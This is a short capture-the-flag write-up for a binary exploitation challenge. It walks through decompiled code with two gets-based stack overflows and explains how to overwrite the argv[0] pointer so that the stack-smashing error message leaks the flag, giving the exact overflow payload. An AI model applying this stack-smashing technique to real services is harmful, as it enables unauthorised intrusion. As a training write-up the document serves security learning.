# No mercy (Pwn)

We get [ELF binary](no_mercy) with canary and NX on.
There are two blatant buffer overflows in the code, since it's using `gets`:

```c
int main() {
    var_AC = *(ecx + 0x4);
    var_C = *0x14;
    eax = 0x0;
    var_70 = 'Flag'; //  0x08048573
    var_6C = '{fla';
    var_68 = 'g_is';
    var_64 = '_on_';
    var_60 = 'serv';
    var_5C = 'er}';
    eax = &var_58;
    ecx = 0x0;
    ebx = 0x1a & 0xfffffffc;
    edx = 0x0;
    do {
            *(ebp + edx + 0xffffffa8) = 0x0;
            edx = edx + 0x4;
    } while (edx < ebx);
    var_70 = 'Flag';
    *(int16_t *)(eax + edx) = 0x0;
    eax = 0x2 + eax + edx;
    eax = strcpy(&var_A2, &var_70);
    eax = printf("what's your name: ");
    eax = gets(&var_3E); // Buffer overflow
    eax = printf("Welcome %s\n", &var_3E);
    eax = printf("so tell me a joke: ");
    eax = gets(&var_70); // Buffer overflow
    eax = printf("so silly , gtfo ==>[]");
    eax = dup2(0x1, 0x2);
    esp = ((((((((esp - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10;
    eax = *0x14 ^ *0x14;
    if (eax != 0x0) {
            eax = __stack_chk_fail();
    }
    else {
            ebx = stack[2046];
            esp = &var_8 + 0xc;
            ebp = stack[2047];
            esp = stack[2045] + 0xfffffffc;
    }
    return eax;
}
```

The trick here is that once you smash the stack, the server actually sends you the error message.
This message contains the name of the binary.
The idea is to overwrite the pointer which points to the binary name, and place there the pointer to flag contents.

The payload we send is: `'a' * 234 + '\x73\x85\x04\x08'`.
We need to go up 234 bytes to reach the pointer position with binary name and then we overwrite it with the flag address.
From this we get back: `Flag{sm4ash_argv_sm4sh_env_sm4sh_ev3rything!}`
